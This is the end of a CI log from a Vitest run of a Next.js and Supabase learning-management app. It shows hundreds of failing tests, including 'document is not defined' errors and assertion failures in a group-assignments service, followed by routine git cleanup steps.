2025-11-18T17:36:11.4188357Z [90m [2m❯[22m Object.setupMain [as setup] node_modules/@testing-library/user-event/dist/esm/setup/setup.js:[2m52:5[22m[39m
2025-11-18T17:36:11.4189101Z [36m [2m❯[22m __tests__/pages/admin/user-management-password-reset.test.tsx:[2m147:28[22m[39m
2025-11-18T17:36:11.4189287Z     [90m145| [39m
2025-11-18T17:36:11.4189790Z     [90m146| [39m  it('should open password reset modal when reset button is clicked', …
2025-11-18T17:36:11.4190114Z     [90m147| [39m    const user = userEvent.setup();
2025-11-18T17:36:11.4190403Z     [90m   | [39m                           [31m^[39m
2025-11-18T17:36:11.4190960Z     [90m148| [39m    render(<UserManagement />);
2025-11-18T17:36:11.4191483Z     [90m149| [39m    await waitFor(() => expect(screen.getByText('John Doe')).toBeInThe…
2025-11-18T17:36:11.4191502Z 
2025-11-18T17:36:11.4191897Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[367/545]⎯[22m[39m
2025-11-18T17:36:11.4191914Z 
2025-11-18T17:36:11.4193616Z [31m[1m[7m FAIL [27m[22m[39m __tests__/pages/admin/user-management-password-reset.test.tsx[2m > [22mUser Management - Password Reset Feature[2m > [22mshould call onSuccess when reset is successful in modal
2025-11-18T17:36:11.4194724Z [31m[1mTypeError[22m: Cannot read properties of undefined (reading 'Symbol(Node prepared with document state workarounds)')[39m
2025-11-18T17:36:11.4195865Z [90m [2m❯[22m prepareDocument node_modules/@testing-library/user-event/dist/esm/document/prepareDocument.js:[2m10:17[22m[39m
2025-11-18T17:36:11.4197925Z [90m [2m❯[22m Object.setupMain [as setup] node_modules/@testing-library/user-event/dist/esm/setup/setup.js:[2m52:5[22m[39m
2025-11-18T17:36:11.4198795Z [36m [2m❯[22m __tests__/pages/admin/user-management-password-reset.test.tsx:[2m160:28[22m[39m
2025-11-18T17:36:11.4199036Z     [90m158| [39m    });
2025-11-18T17:36:11.4199214Z     [90m159| [39m
2025-11-18T17:36:11.4199568Z     [90m160| [39m    const user = userEvent.setup();
2025-11-18T17:36:11.4199900Z     [90m   | [39m                           [31m^[39m
2025-11-18T17:36:11.4200473Z     [90m161| [39m    render(<UserManagement />);
2025-11-18T17:36:11.4201087Z     [90m162| [39m    await waitFor(() => expect(screen.getByText('John Doe')).toBeInThe…
2025-11-18T17:36:11.4201116Z 
2025-11-18T17:36:11.4201542Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[368/545]⎯[22m[39m
2025-11-18T17:36:11.4201566Z 
2025-11-18T17:36:11.4203231Z [31m[1m[7m FAIL [27m[22m[39m __tests__/pages/admin/user-management-password-reset.test.tsx[2m > [22mUser Management - Password Reset Feature[2m > [22mshould not show password reset for non-admin users
2025-11-18T17:36:11.4203746Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.4204448Z [90m [2m❯[22m render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.4205242Z [36m [2m❯[22m __tests__/pages/admin/user-management-password-reset.test.tsx:[2m185:5[22m[39m
2025-11-18T17:36:11.4205460Z     [90m183| [39m    });
2025-11-18T17:36:11.4205645Z     [90m184| [39m
2025-11-18T17:36:11.4205989Z     [90m185| [39m    render(<UserManagement />);
2025-11-18T17:36:11.4206228Z     [90m   | [39m    [31m^[39m
2025-11-18T17:36:11.4206524Z     [90m186| [39m    await waitFor(() => {
2025-11-18T17:36:11.4207201Z     [90m187| [39m      expect(mockPush).toHaveBeenCalledWith('/dashboard');
2025-11-18T17:36:11.4207221Z 
2025-11-18T17:36:11.4207651Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[369/545]⎯[22m[39m
2025-11-18T17:36:11.4207666Z 
2025-11-18T17:36:11.4209174Z [31m[1m[7m FAIL [27m[22m[39m components/blocks/__tests__/BlockRenderer.test.tsx[2m > [22mBlockRenderer Component[2m > [22mrenders a text block and calls onChange when textarea is edited
2025-11-18T17:36:11.4209909Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.4210640Z [90m [2m❯[22m Proxy.render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.4211327Z [36m [2m❯[22m components/blocks/__tests__/BlockRenderer.test.tsx:[2m16:5[22m[39m
2025-11-18T17:36:11.4211582Z     [90m 14| [39m    };
2025-11-18T17:36:11.4211759Z     [90m 15| [39m
2025-11-18T17:36:11.4212364Z     [90m 16| [39m    render(<BlockRenderer block={initialTextBlock} onChange={mockOnCha…
2025-11-18T17:36:11.4212717Z     [90m   | [39m    [31m^[39m
2025-11-18T17:36:11.4212915Z     [90m 17| [39m
2025-11-18T17:36:11.4213513Z     [90m 18| [39m    const textarea = screen.getByPlaceholderText('Enter text content..…
2025-11-18T17:36:11.4213534Z 
2025-11-18T17:36:11.4213963Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[370/545]⎯[22m[39m
2025-11-18T17:36:11.4213998Z 
2025-11-18T17:36:11.4215515Z [31m[1m[7m FAIL [27m[22m[39m components/blocks/__tests__/BlockRenderer.test.tsx[2m > [22mBlockRenderer Component[2m > [22mrenders a video block and calls onChange when input is edited
2025-11-18T17:36:11.4216025Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.4217109Z [90m [2m❯[22m Proxy.render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.4218092Z [36m [2m❯[22m components/blocks/__tests__/BlockRenderer.test.tsx:[2m40:5[22m[39m
2025-11-18T17:36:11.4218362Z     [90m 38| [39m    };
2025-11-18T17:36:11.4218562Z     [90m 39| [39m
2025-11-18T17:36:11.4219191Z     [90m 40| [39m    render(<BlockRenderer block={initialVideoBlock} onChange={mockOnCh…
2025-11-18T17:36:11.4219471Z     [90m   | [39m    [31m^[39m
2025-11-18T17:36:11.4219675Z     [90m 41| [39m
2025-11-18T17:36:11.4220286Z     [90m 42| [39m    const input = screen.getByPlaceholderText('Video URL (e.g., YouTub…
2025-11-18T17:36:11.4220321Z 
2025-11-18T17:36:11.4220754Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[371/545]⎯[22m[39m
2025-11-18T17:36:11.4220771Z 
2025-11-18T17:36:11.4222189Z [31m[1m[7m FAIL [27m[22m[39m components/blocks/__tests__/BlockRenderer.test.tsx[2m > [22mBlockRenderer Component[2m > [22mrenders fallback UI for an unknown block type
2025-11-18T17:36:11.4222719Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.4223517Z [90m [2m❯[22m Proxy.render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.4224221Z [36m [2m❯[22m components/blocks/__tests__/BlockRenderer.test.tsx:[2m65:5[22m[39m
2025-11-18T17:36:11.4224531Z     [90m 63| [39m    } as any as Block;
2025-11-18T17:36:11.4224722Z     [90m 64| [39m
2025-11-18T17:36:11.4225317Z     [90m 65| [39m    render(<BlockRenderer block={unknownBlock} onChange={mockOnChange}…
2025-11-18T17:36:11.4225564Z     [90m   | [39m    [31m^[39m
2025-11-18T17:36:11.4225750Z     [90m 66| [39m
2025-11-18T17:36:11.4226377Z     [90m 67| [39m    expect(screen.getByText('Unknown block type: quiz')).toBeInTheDocu…
2025-11-18T17:36:11.4226395Z 
2025-11-18T17:36:11.4227009Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[372/545]⎯[22m[39m
2025-11-18T17:36:11.4227028Z 
2025-11-18T17:36:11.4228903Z [31m[1m[7m FAIL [27m[22m[39m lib/services/__tests__/groupAssignmentsV2.test.js[2m > [22mGroupAssignmentsV2Service[2m > [22mgetGroupMembers - Data Structure[2m > [22mshould transform profile data to include user.full_name
2025-11-18T17:36:11.4229599Z [31m[1mAssertionError[22m: expected [] to have a length of 1 but got +0[39m
2025-11-18T17:36:11.4229618Z 
2025-11-18T17:36:11.4229754Z - Expected
2025-11-18T17:36:11.4229882Z + Received
2025-11-18T17:36:11.4229894Z 
2025-11-18T17:36:11.4230007Z - 1
2025-11-18T17:36:11.4230128Z + 0
2025-11-18T17:36:11.4230140Z 
2025-11-18T17:36:11.4230847Z [36m [2m❯[22m lib/services/__tests__/groupAssignmentsV2.test.js:[2m232:30[22m[39m
2025-11-18T17:36:11.4231082Z     [90m230| [39m
2025-11-18T17:36:11.4231866Z     [90m231| [39m      // Verify member.user structure exists with full_name
2025-11-18T17:36:11.4232317Z     [90m232| [39m      expect(result.members).toHaveLength(1);
2025-11-18T17:36:11.4232654Z     [90m   | [39m                             [31m^[39m
2025-11-18T17:36:11.4233028Z     [90m233| [39m      const member = result.members[0];
2025-11-18T17:36:11.4233240Z     [90m234| [39m
2025-11-18T17:36:11.4233271Z 
2025-11-18T17:36:11.4233670Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[373/545]⎯[22m[39m
2025-11-18T17:36:11.4233684Z 
2025-11-18T17:36:11.4235460Z [31m[1m[7m FAIL [27m[22m[39m lib/services/__tests__/groupAssignmentsV2.test.js[2m > [22mGroupAssignmentsV2Service[2m > [22mgetGroupMembers - Data Structure[2m > [22mshould handle empty name fields gracefully
2025-11-18T17:36:11.4236156Z [31m[1mTypeError[22m: Cannot read properties of undefined (reading 'user')[39m
2025-11-18T17:36:11.4237190Z [36m [2m❯[22m lib/services/__tests__/groupAssignmentsV2.test.js:[2m259:32[22m[39m
2025-11-18T17:36:11.4237906Z     [90m257| [39m      const result = await groupAssignmentsV2Service.getGroupMembers('…
2025-11-18T17:36:11.4238135Z     [90m258| [39m
2025-11-18T17:36:11.4238624Z     [90m259| [39m      expect(result.members[0].user.full_name).toBe('');
2025-11-18T17:36:11.4239013Z     [90m   | [39m                               [31m^[39m
2025-11-18T17:36:11.4239238Z     [90m260| [39m    });
2025-11-18T17:36:11.4239670Z     [90m261| [39m
2025-11-18T17:36:11.4239697Z 
2025-11-18T17:36:11.4240149Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[374/545]⎯[22m[39m
2025-11-18T17:36:11.4240167Z 
2025-11-18T17:36:11.4241836Z [31m[1m[7m FAIL [27m[22m[39m lib/services/__tests__/groupAssignmentsV2.test.js[2m > [22mGroupAssignmentsV2Service[2m > [22mgetGroupMembers - Data Structure[2m > [22mshould handle missing last name
2025-11-18T17:36:11.4242520Z [31m[1mTypeError[22m: Cannot read properties of undefined (reading 'user')[39m
2025-11-18T17:36:11.4243183Z [36m [2m❯[22m lib/services/__tests__/groupAssignmentsV2.test.js:[2m274:32[22m[39m
2025-11-18T17:36:11.4243789Z     [90m272| [39m      const result = await groupAssignmentsV2Service.getGroupMembers('…
2025-11-18T17:36:11.4243977Z     [90m273| [39m
2025-11-18T17:36:11.4244461Z     [90m274| [39m      expect(result.members[0].user.full_name).toBe('Juan');
2025-11-18T17:36:11.4244802Z     [90m   | [39m                               [31m^[39m
2025-11-18T17:36:11.4245019Z     [90m275| [39m    });
2025-11-18T17:36:11.4245197Z     [90m276| [39m  });
2025-11-18T17:36:11.4245210Z 
2025-11-18T17:36:11.4245560Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[375/545]⎯[22m[39m
2025-11-18T17:36:11.4245581Z 
2025-11-18T17:36:11.4247532Z [31m[1m[7m FAIL [27m[22m[39m lib/services/__tests__/groupAssignmentsV2.test.js[2m > [22mGroupAssignmentsV2Service[2m > [22mgetOrCreateGroup - Policy Error Handling[2m > [22mshould return error for RLS infinite recursion (42P17)
2025-11-18T17:36:11.4248468Z [31m[1mAssertionError[22m: expected 'TypeError: fetch failed' to include 'Error de configuración del sistema'[39m
2025-11-18T17:36:11.4249066Z [36m [2m❯[22m lib/services/__tests__/groupAssignmentsV2.test.js:[2m296:36[22m[39m
2025-11-18T17:36:11.4249405Z     [90m294| [39m      expect(result.group).toBeNull();
2025-11-18T17:36:11.4249754Z     [90m295| [39m      expect(result.error).toBeDefined();
2025-11-18T17:36:11.4250294Z     [90m296| [39m      expect(result.error.message).toContain('Error de configuración d…
2025-11-18T17:36:11.4250621Z     [90m   | [39m                                   [31m^[39m
2025-11-18T17:36:11.4250796Z     [90m297| [39m    });
2025-11-18T17:36:11.4250963Z     [90m298| [39m
2025-11-18T17:36:11.4250975Z 
2025-11-18T17:36:11.4251319Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[376/545]⎯[22m[39m
2025-11-18T17:36:11.4251329Z 
2025-11-18T17:36:11.4253129Z [31m[1m[7m FAIL [27m[22m[39m lib/services/__tests__/groupAssignmentsV2.test.js[2m > [22mGroupAssignmentsV2Service[2m > [22mgetOrCreateGroup - Policy Error Handling[2m > [22mshould return error for permission denied (42501)
2025-11-18T17:36:11.4254045Z [31m[1mAssertionError[22m: expected 'TypeError: fetch failed' to include 'No tienes permiso'[39m
2025-11-18T17:36:11.4254659Z [36m [2m❯[22m lib/services/__tests__/groupAssignmentsV2.test.js:[2m316:36[22m[39m
2025-11-18T17:36:11.4255016Z     [90m314| [39m      expect(result.group).toBeNull();
2025-11-18T17:36:11.4255390Z     [90m315| [39m      expect(result.error).toBeDefined();
2025-11-18T17:36:11.4255908Z     [90m316| [39m      expect(result.error.message).toContain('No tienes permiso');
2025-11-18T17:36:11.4256242Z     [90m   | [39m                                   [31m^[39m
2025-11-18T17:36:11.4256421Z     [90m317| [39m    });
2025-11-18T17:36:11.4256584Z     [90m318| [39m
2025-11-18T17:36:11.4256595Z 
2025-11-18T17:36:11.4257206Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[377/545]⎯[22m[39m
2025-11-18T17:36:11.4257220Z 
2025-11-18T17:36:11.4259210Z [31m[1m[7m FAIL [27m[22m[39m lib/services/__tests__/groupAssignmentsV2.test.js[2m > [22mGroupAssignmentsV2Service[2m > [22mgetOrCreateGroup - Policy Error Handling[2m > [22mshould return error for unexpected database errors (not PGRST116)
2025-11-18T17:36:11.4260010Z [31m[1mAssertionError[22m: expected { …(4) } to be { code: 'PGRST301', …(1) } // Object.is equality[39m
2025-11-18T17:36:11.4260022Z 
2025-11-18T17:36:11.4260144Z - Expected
2025-11-18T17:36:11.4260437Z + Received
2025-11-18T17:36:11.4260450Z 
2025-11-18T17:36:11.4260568Z   Object {
2025-11-18T17:36:11.4260739Z -   "code": "PGRST301",
2025-11-18T17:36:11.4260967Z -   "message": "Connection timeout",
2025-11-18T17:36:11.4261091Z +   "code": "",
2025-11-18T17:36:11.4261326Z +   "details": "TypeError: fetch failed
2025-11-18T17:36:11.4261615Z +     at node:internal/deps/undici/undici:12637:11
2025-11-18T17:36:11.4262114Z +     at processTicksAndRejections (node:internal/process/task_queues:95:5)
2025-11-18T17:36:11.4263069Z +     at GroupAssignmentsV2Service.getOrCreateGroup (/home/runner/work/fne-lms/fne-lms/lib/services/groupAssignmentsV2.js:310:65)
2025-11-18T17:36:11.4263735Z +     at /home/runner/work/fne-lms/fne-lms/lib/services/__tests__/groupAssignmentsV2.test.js:334:22
2025-11-18T17:36:11.4264427Z +     at runTest (file:///home/runner/work/fne-lms/fne-lms/node_modules/@vitest/runner/dist/index.js:663:11)
2025-11-18T17:36:11.4265126Z +     at runSuite (file:///home/runner/work/fne-lms/fne-lms/node_modules/@vitest/runner/dist/index.js:782:15)
2025-11-18T17:36:11.4265800Z +     at runSuite (file:///home/runner/work/fne-lms/fne-lms/node_modules/@vitest/runner/dist/index.js:782:15)
2025-11-18T17:36:11.4266483Z +     at runSuite (file:///home/runner/work/fne-lms/fne-lms/node_modules/@vitest/runner/dist/index.js:782:15)
2025-11-18T17:36:11.4267305Z +     at runFiles (file:///home/runner/work/fne-lms/fne-lms/node_modules/@vitest/runner/dist/index.js:834:5)
2025-11-18T17:36:11.4268025Z +     at startTests (file:///home/runner/work/fne-lms/fne-lms/node_modules/@vitest/runner/dist/index.js:843:3)",
2025-11-18T17:36:11.4268152Z +   "hint": "",
2025-11-18T17:36:11.4268396Z +   "message": "TypeError: fetch failed",
2025-11-18T17:36:11.4268515Z   }
2025-11-18T17:36:11.4268526Z 
2025-11-18T17:36:11.4269187Z [36m [2m❯[22m lib/services/__tests__/groupAssignmentsV2.test.js:[2m338:28[22m[39m
2025-11-18T17:36:11.4269655Z     [90m336| [39m      // Should return the error, not proceed to create group
2025-11-18T17:36:11.4269984Z     [90m337| [39m      expect(result.group).toBeNull();
2025-11-18T17:36:11.4270376Z     [90m338| [39m      expect(result.error).toBe(unexpectedError);
2025-11-18T17:36:11.4270656Z     [90m   | [39m                           [31m^[39m
2025-11-18T17:36:11.4270835Z     [90m339| [39m    });
2025-11-18T17:36:11.4271001Z     [90m340| [39m
2025-11-18T17:36:11.4271012Z 
2025-11-18T17:36:11.4271374Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[378/545]⎯[22m[39m
2025-11-18T17:36:11.4271391Z 
2025-11-18T17:36:11.4273383Z [31m[1m[7m FAIL [27m[22m[39m lib/services/__tests__/groupAssignmentsV2.test.js[2m > [22mGroupAssignmentsV2Service[2m > [22mgetOrCreateGroup - Policy Error Handling[2m > [22mshould proceed to create group when error is PGRST116 (no rows found)
2025-11-18T17:36:11.4274054Z [31m[1mAssertionError[22m: expected { …(4) } to be null[39m
2025-11-18T17:36:11.4274667Z [36m [2m❯[22m lib/services/__tests__/groupAssignmentsV2.test.js:[2m370:28[22m[39m
2025-11-18T17:36:11.4275187Z     [90m368| [39m      // Should successfully create group when no existing membership …
2025-11-18T17:36:11.4275524Z     [90m369| [39m      expect(result.group).toBeDefined();
2025-11-18T17:36:11.4275836Z     [90m370| [39m      expect(result.error).toBeNull();
2025-11-18T17:36:11.4276119Z     [90m   | [39m                           [31m^[39m
2025-11-18T17:36:11.4276286Z     [90m371| [39m    });
2025-11-18T17:36:11.4276449Z     [90m372| [39m
2025-11-18T17:36:11.4276460Z 
2025-11-18T17:36:11.4276991Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[379/545]⎯[22m[39m
2025-11-18T17:36:11.4277018Z 
2025-11-18T17:36:11.4277026Z 
2025-11-18T17:36:11.4277440Z [31m⎯⎯⎯⎯[1m[7m Unhandled Rejection [27m[22m⎯⎯⎯⎯⎯[39m
2025-11-18T17:36:11.4277858Z [31m[1mTypeError[22m: _a.getHeader is not a function[39m
2025-11-18T17:36:11.4279010Z [90m [2m❯[22m NextServerAuthStorageAdapter.getCookie node_modules/@supabase/auth-helpers-nextjs/src/pagesServerClient.ts:[2m29:22[22m[39m
2025-11-18T17:36:11.4280486Z [90m [2m❯[22m NextServerAuthStorageAdapter.getItem node_modules/@supabase/auth-helpers-shared/src/cookieAuthStorageAdapter.ts:[2m24:22[22m[39m
2025-11-18T17:36:11.4281220Z [90m [2m❯[22m getItemAsync node_modules/@supabase/auth-js/src/lib/helpers.ts:[2m130:31[22m[39m
2025-11-18T17:36:11.4282167Z [90m [2m❯[22m SupabaseAuthClient.__loadSession node_modules/@supabase/auth-js/src/GoTrueClient.ts:[2m1541:46[22m[39m
2025-11-18T17:36:11.4283103Z [90m [2m❯[22m SupabaseAuthClient._useSession node_modules/@supabase/auth-js/src/GoTrueClient.ts:[2m1499:33[22m[39m
2025-11-18T17:36:11.4284144Z [90m [2m❯[22m SupabaseAuthClient._emitInitialSession node_modules/@supabase/auth-js/src/GoTrueClient.ts:[2m2136:23[22m[39m
2025-11-18T17:36:11.4284741Z [90m [2m❯[22m node_modules/@supabase/auth-js/src/GoTrueClient.ts:[2m2128:14[22m[39m
2025-11-18T17:36:11.4285338Z [90m [2m❯[22m node_modules/@supabase/auth-js/src/GoTrueClient.ts:[2m1431:26[22m[39m
2025-11-18T17:36:11.4286281Z [90m [2m❯[22m SupabaseAuthClient.lockNoOp [as lock] node_modules/@supabase/auth-js/src/GoTrueClient.ts:[2m172:16[22m[39m
2025-11-18T17:36:11.4287339Z [90m [2m❯[22m SupabaseAuthClient._acquireLock node_modules/@supabase/auth-js/src/GoTrueClient.ts:[2m1425:25[22m[39m
2025-11-18T17:36:11.4287354Z 
2025-11-18T17:36:11.4288788Z [31mThis error originated in "[1m__tests__/api/admin/user-roles.test.ts[22m" test file. It doesn't mean the error was thrown inside the file itself, but while it was running.[39m
2025-11-18T17:36:11.4288836Z 
2025-11-18T17:36:11.4289341Z [31m⎯⎯⎯⎯[1m[7m Unhandled Rejection [27m[22m⎯⎯⎯⎯⎯[39m
2025-11-18T17:36:11.4289795Z [31m[1mTypeError[22m: _a.getHeader is not a function[39m
2025-11-18T17:36:11.4291014Z [90m [2m❯[22m NextServerAuthStorageAdapter.getCookie node_modules/@supabase/auth-helpers-nextjs/src/pagesServerClient.ts:[2m29:22[22m[39m
2025-11-18T17:36:11.4292201Z [90m [2m❯[22m NextServerAuthStorageAdapter.getItem node_modules/@supabase/auth-helpers-shared/src/cookieAuthStorageAdapter.ts:[2m24:22[22m[39m
2025-11-18T17:36:11.4292933Z [90m [2m❯[22m getItemAsync node_modules/@supabase/auth-js/src/lib/helpers.ts:[2m130:31[22m[39m
2025-11-18T17:36:11.4293880Z [90m [2m❯[22m SupabaseAuthClient.__loadSession node_modules/@supabase/auth-js/src/GoTrueClient.ts:[2m1541:46[22m[39m
2025-11-18T17:36:11.4294799Z [90m [2m❯[22m SupabaseAuthClient._useSession node_modules/@supabase/auth-js/src/GoTrueClient.ts:[2m1499:33[22m[39m
2025-11-18T17:36:11.4296039Z [90m [2m❯[22m SupabaseAuthClient._emitInitialSession node_modules/@supabase/auth-js/src/GoTrueClient.ts:[2m2136:23[22m[39m
2025-11-18T17:36:11.4297154Z [90m [2m❯[22m node_modules/@supabase/auth-js/src/GoTrueClient.ts:[2m2128:14[22m[39m
2025-11-18T17:36:11.4297802Z [90m [2m❯[22m node_modules/@supabase/auth-js/src/GoTrueClient.ts:[2m1431:26[22m[39m
2025-11-18T17:36:11.4298765Z [90m [2m❯[22m SupabaseAuthClient.lockNoOp [as lock] node_modules/@supabase/auth-js/src/GoTrueClient.ts:[2m172:16[22m[39m
2025-11-18T17:36:11.4299706Z [90m [2m❯[22m SupabaseAuthClient._acquireLock node_modules/@supabase/auth-js/src/GoTrueClient.ts:[2m1425:25[22m[39m
2025-11-18T17:36:11.4299724Z 
2025-11-18T17:36:11.4301100Z [31mThis error originated in "[1m__tests__/api/admin/user-roles.test.ts[22m" test file. It doesn't mean the error was thrown inside the file itself, but while it was running.[39m
2025-11-18T17:36:11.4301115Z 
2025-11-18T17:36:11.4301575Z [31m⎯⎯⎯⎯⎯⎯[1m[7m Unhandled Errors [27m[22m⎯⎯⎯⎯⎯⎯[39m
2025-11-18T17:36:11.4301738Z [31m[1m
2025-11-18T17:36:11.4302078Z Vitest caught 2 unhandled errors during the test run.
2025-11-18T17:36:11.4302973Z This might cause false positive tests. Resolve unhandled errors to make sure your tests are not affected.[22m[39m
2025-11-18T17:36:11.4303317Z [31m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[39m
2025-11-18T17:36:11.4303782Z [2m Test Files [22m [1m[31m68 failed[39m[22m[2m | [22m[1m[32m20 passed[39m[22m[90m (88)[39m
2025-11-18T17:36:11.4304359Z [2m      Tests [22m [1m[31m424 failed[39m[22m[2m | [22m[1m[32m350 passed[39m[22m[90m (799)[39m
2025-11-18T17:36:11.4304570Z [2m     Errors [22m [1m[31m2 errors[39m[22m
2025-11-18T17:36:11.4304736Z [2m   Start at [22m 17:35:23
2025-11-18T17:36:11.4305263Z [2m   Duration [22m 47.88s[2m (transform 1.52s, setup 11.39s, collect 6.76s, tests 2.33s, environment 14ms, prepare 8.18s)[22m
2025-11-18T17:36:11.4305272Z 
2025-11-18T17:36:11.4308582Z ##[error]Process completed with exit code 1.
2025-11-18T17:36:11.4397502Z Post job cleanup.
2025-11-18T17:36:11.5349668Z [command]/usr/bin/git version
2025-11-18T17:36:11.5401473Z git version 2.51.2
2025-11-18T17:36:11.5441348Z Temporarily overriding HOME='/home/runner/work/_temp/89f09148-0927-4e48-87e2-8db923c6d195' before making global git config changes
2025-11-18T17:36:11.5443148Z Adding repository directory to the temporary git global config as a safe directory
2025-11-18T17:36:11.5448104Z [command]/usr/bin/git config --global --add safe.directory /home/runner/work/fne-lms/fne-lms
2025-11-18T17:36:11.5492139Z [command]/usr/bin/git config --local --name-only --get-regexp core\.sshCommand
2025-11-18T17:36:11.5527789Z [command]/usr/bin/git submodule foreach --recursive sh -c "git config --local --name-only --get-regexp 'core\.sshCommand' && git config --local --unset-all 'core.sshCommand' || :"
2025-11-18T17:36:11.5770937Z [command]/usr/bin/git config --local --name-only --get-regexp http\.https\:\/\/github\.com\/\.extraheader
2025-11-18T17:36:11.5813093Z http.https://github.com/.extraheader
2025-11-18T17:36:11.5814596Z [command]/usr/bin/git config --local --unset-all http.https://github.com/.extraheader
2025-11-18T17:36:11.5849062Z [command]/usr/bin/git submodule foreach --recursive sh -c "git config --local --name-only --get-regexp 'http\.https\:\/\/github\.com\/\.extraheader' && git config --local --unset-all 'http.https://github.com/.extraheader' || :"
2025-11-18T17:36:11.6209952Z Cleaning up orphan processes
